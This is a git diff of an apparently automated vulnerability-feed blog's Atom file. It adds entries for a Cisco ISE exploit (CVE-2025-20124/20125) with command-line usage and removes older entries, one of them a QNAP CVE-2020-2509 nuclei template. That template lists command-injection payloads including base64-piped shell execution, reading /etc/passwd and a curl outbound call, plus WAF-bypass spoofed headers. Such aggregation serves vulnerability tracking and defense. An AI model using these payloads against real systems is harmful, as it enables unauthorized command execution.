@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-16T07:45:14.177Z</updated>
+  <updated>2025-06-16T08:15:14.847Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,86 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Cisco ISE RCE and Authorization Bypass Vulnerability</title>
+    <link href="http://example.com/2025/06/16/github_109439477/"/>
+    <id>http://example.com/2025/06/16/github_109439477/</id>
+    <published>2025-06-16T08:15:14.849Z</published>
+    <updated>2025-06-16T08:15:14.847Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco ISE RCE and Authorization Bypass Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-20124, CVE-2025-20125</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Cisco ISE 存在远程代码执行（RCE）和授权绕过漏洞，攻击者可以通过发送特制的请求执行任意命令或绕过身份验证。利用这些漏洞需要管理员登录权限。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco ISE</p><p><strong>来源：</strong> <a href="https://github.com/Yuri08loveElaina/CVE-2025-20124_and_CVE-2025-20125">https://github.com/Yuri08loveElaina/CVE-2025-20124_and_CVE-2025-20125</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>Exploit.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="🗒️-How-to-use"><a href="#🗒️-How-to-use" class="headerlink" title="🗒️ How to use"></a>🗒️ How to use</h3><ul><li><h2 id="cve‑20124-RCE"><a href="#cve‑20124-RCE" class="headerlink" title="cve‑20124 (RCE):"></a>cve‑20124 (RCE):</h2></li></ul><blockquote><p>python3 Exploit.py –url <a href="https://ise.example.com/">https://ise.example.com</a><br>–Session your_ISE_Session_Token –DESER-CMD “Touch &#x2F;TMP &#x2F;PWWNED”</p></blockquote><ul><li><h2 id="cve‑20125-authorized-bypass"><a href="#cve‑20125-authorized-bypass" class="headerlink" title="cve‑20125 (authorized bypass):"></a>cve‑20125 (authorized bypass):</h2></li></ul><blockquote><p>python3 Exploit.py –url <a href="https://ise.example.com/">https://ise.example.com</a><br>–Session your_ISE_Session_Token –Bbypass</p></blockquote><ul><li><p>⚠️ Important note<br>Both drive require an ISE administrator to log in (the administrator only read is enough)</p></li><li><p>This is only an example; In the actual  you need:</p></li></ul><blockquote><p>The Java utility chain is true to sequentially self -transparent CVE‑201224.</p></blockquote><blockquote><p>Final score authentication (using assumption&#x2F;API&#x2F;V1&#x2F;Admin&#x2F;*).</p></blockquote><p>🔍 Reference source<br>Cisco ADVISORY CVE‑20124 &amp; Cve‑20125 - Receive RCE level &amp; ignore the required authentication.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco ISE RCE and Authorization Bypass </summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安恒信息天池云安全管理平台和SMARTX企业云平台组件SMTX OS完成兼容适配，达成生态合作</title>
+    <link href="http://example.com/2025/06/16/weixin_3243392816/"/>
+    <id>http://example.com/2025/06/16/weixin_3243392816/</id>
+    <published>2025-06-16T08:07:26.159Z</published>
+    <updated>2025-06-16T08:07:26.156Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Tm0Q8ei0C4XL6YgDIz-3kg">https://mp.weixin.qq.com/s/Tm0Q8ei0C4XL6YgDIz-3kg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Tm0Q8ei0C4XL6YgDIz-3kg&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>小心“银狐”！别让财务人员成为银狐病毒的“突破口 ”</title>
+    <link href="http://example.com/2025/06/16/weixin_3422375941/"/>
+    <id>http://example.com/2025/06/16/weixin_3422375941/</id>
+    <published>2025-06-16T08:07:25.365Z</published>
+    <updated>2025-06-16T08:07:25.360Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/2H2Dwn51L2dINaCGlQKsuA">https://mp.weixin.qq.com/s/2H2Dwn51L2dINaCGlQKsuA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/2H2Dwn51L2dINaCGlQKsuA&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
+    
+  </entry>
   
   <entry>
     <title>HAMASTAR Technology WIMP website co-construction management platform SQL Injection Vulnerability</title>
@@ -450,86 +530,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP QTS &amp;#x2F; QuTS 通过平台参数认证的远程代码执行漏洞&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2023-1698 Exploit</title>
-    <link href="http://example.com/2025/06/15/github_649269984/"/>
-    <id>http://example.com/2025/06/15/github_649269984/</id>
-    <published>2025-06-15T18:15:59.617Z</published>
-    <updated>2025-06-15T18:15:59.615Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2023-1698 Exploit</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-1698</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> CVE-2023-1698的利用工具，使用golang编写。</p><p><strong>来源：</strong> <a href="https://github.com/ibrahmsql/CVE-2023-1698">https://github.com/ibrahmsql/CVE-2023-1698</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>main</li><li>main.go</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2023-1698"><a href="#CVE-2023-1698" class="headerlink" title="CVE-2023-1698"></a>CVE-2023-1698</h2><p>CVE-2023-1698 exploit with golang </p><h2 id="how-to-use"><a href="#how-to-use" class="headerlink" title="how to use"></a>how to use</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build  CVE<span class="hljs-number">-2023</span><span class="hljs-number">-1698</span> main.<span class="hljs-keyword">go</span> <br>OR<br><span class="hljs-keyword">go</span> build main.<span class="hljs-keyword">go</span> <br></code></pre></td></tr></table></figure><hr><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Examples:</span><br>  <span class="hljs-symbol">./cve-2023-1698</span> <span class="hljs-operator">-</span>u http:<span class="hljs-symbol">//target.com</span><br>  <span class="hljs-symbol">./cve-2023-1698</span> <span class="hljs-operator">-</span>l urls.txt <span class="hljs-operator">-</span>o vulnerable.txt <span class="hljs-operator">-</span>t <span class="hljs-number">20</span><br>  <span class="hljs-symbol">./cve-2023-1698</span> <span class="hljs-operator">-</span>u http:<span class="hljs-symbol">//target.com</span> <span class="hljs-operator">-</span>c <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-operator">-</span>v<br></code></pre></td></tr></table></figure><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2023-1698 Exploit&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
-    
-    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>QTS &amp; QuTS Command Injection Vulnerability</title>
-    <link href="http://example.com/2025/06/15/github_3595880860/"/>
-    <id>http://example.com/2025/06/15/github_3595880860/</id>
-    <published>2025-06-15T18:15:43.836Z</published>
-    <updated>2025-06-15T18:15:43.835Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QTS &amp; QuTS Command Injection Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-2509</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QTS和QuTS hero因应用程序中不当的输入处理而包含命令注入漏洞，允许攻击者通过发送精心构造的输入执行任意命令。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> QTS &amp; QuTS hero</p><p><strong>搜索语法：</strong> product:”qnap”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12355">https://github.com/projectdiscovery/nuclei-templates/issues/12355</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>QTS and QuTS hero contain a command injection caused by improper input handling in the application, letting attackers execute arbitrary commands, exploit requires attacker to send crafted input.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/jbaines-r7/overkill">https://github.com/jbaines-r7/overkill</a></li><li><a href="https://vulncheck.com/xdb/533b5e83b1eb">https://vulncheck.com/xdb/533b5e83b1eb</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:jbaines-r7&#x2F;overkill.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-product-qnap"><a href="#Shodan-Query-product-qnap" class="headerlink" title="Shodan Query: product:&quot;qnap&quot;"></a>Shodan Query: <code>product:&quot;qnap&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QTS &amp;amp; QuTS Command Injection Vulner</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>QNAP QTS/QuTS 高级认证命令注入漏洞</title>
-    <link href="http://example.com/2025/06/15/github_101251888/"/>
-    <id>http://example.com/2025/06/15/github_101251888/</id>
-    <published>2025-06-15T17:15:41.926Z</published>
-    <updated>2025-06-15T17:15:41.923Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP QTS&#x2F;QuTS 高级认证命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-2509</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP QTS&#x2F;QuTS中存在一个高级认证命令注入漏洞（CVE-2020-2509），攻击者可以通过发送特制的HTTP请求来执行任意命令。此漏洞利用了QNAP设备中的qapp_platform.cgi接口，通过精心构造的payload实现命令注入。漏洞利用包括多态payload、编码、高级WAF绕过头部以及灵活的body注入点。</p><p><strong>产品厂商：</strong> QNAP</p><p><strong>产品名称：</strong> QNAP QTS&#x2F;QuTS</p><p><strong>搜索语法：</strong> product:”qnap”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/3571b73013ff27b8eb9c071d7a965fe15ade34c1/http%2Fcves%2F2020%2Fcve-2020-2509-qnap-rce-advanced.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/3571b73013ff27b8eb9c071d7a965fe15ade34c1/http%2Fcves%2F2020%2Fcve-2020-2509-qnap-rce-advanced.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> cve-<span class="hljs-number">202</span>0-<span class="hljs-number">250</span>9-qnap-rce-ultra<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP QTS<span class="hljs-symbol">/QuTS</span> <span class="hljs-operator">-</span> Advanced Authenticated Command Injection (CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">2509</span>)<br>  <span class="hljs-params">author:</span> malek838<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Ultra-advanced nuclei template exploiting CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">2509</span> <span class="hljs-keyword">in</span> QNAP QTS<span class="hljs-symbol">/QuTS</span> <span class="hljs-keyword">with</span> enhanced evasion.<br>    Includes polymorphic payloads, encoding, advanced WAF bypass headers, and flexible body injection points.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/jbaines-r7/overkill</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/533b5e83b1eb</span><br>  <span class="hljs-params">tags:</span> cve,cve2020,qnap,rce,command-injection,authenticated,bounty,obfuscation,waf-bypass<br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">shodan-query:</span> &#x27;product:<span class="hljs-string">&quot;qnap&quot;</span>&#x27;<br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">12</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/qapp_platform.cgi&quot;</span><br><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> <span class="hljs-string">&quot;&#123;&#123;user_agent&#125;&#125;&quot;</span><br>      <span class="hljs-params">X-Forwarded-For:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>      <span class="hljs-params">X-Originating-IP:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>      <span class="hljs-params">X-Remote-IP:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>      <span class="hljs-params">X-Remote-Addr:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>      <span class="hljs-params">X-Requested-With:</span> <span class="hljs-string">&quot;XMLHttpRequest&quot;</span><br>      <span class="hljs-params">Accept-Language:</span> <span class="hljs-string">&quot;en-US,en;q=0.9&quot;</span><br>      <span class="hljs-params">Referer:</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/dashboard&quot;</span><br>      <span class="hljs-params">Origin:</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;&quot;</span><br>      <span class="hljs-params">Content-Type:</span> <span class="hljs-string">&quot;application/json&quot;</span><br><br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">payload:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;|id|&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;;id;&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;`id`&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;$(id)&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;|echo aWQK|base64 -d|sh&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;i<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>d&quot;</span>                   <span class="hljs-comment"># bypass some filters</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;$(which<span class="hljs-char escape_">\\</span> id)&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;$(ec<span class="hljs-char escape_">\\</span>ho uid=999)&quot;</span>       <span class="hljs-comment"># fake echo payload</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;`whoami`&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;`cat /etc/passwd | grep admin`&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;|sleep<span class="hljs-subst">$&#123;IFS&#125;</span>1|id&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;;curl<span class="hljs-subst">$&#123;IFS&#125;</span>example.com;&quot;</span> <span class="hljs-comment"># dummy outbound payload</span><br><br>      <span class="hljs-params">user_agent:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64)&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;curl/7.68.0&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Wget/1.20.3 (linux-gnu)&quot;</span><br><br>    <span class="hljs-params">body:</span> |<br>      &#123;<br>        <span class="hljs-string">&quot;platform&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;payload&#125;&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;payload&#125;&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;desc&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;payload&#125;&#125;&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">attack:</span> pitchfork<br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;gid=&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;root&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;admin&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=.*?gid=.*&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;root:.*?:[0-9]+:[0-9]+&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP QTS&amp;#x2F;QuTS 高级认证命令注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;s</summary>
       
     
     
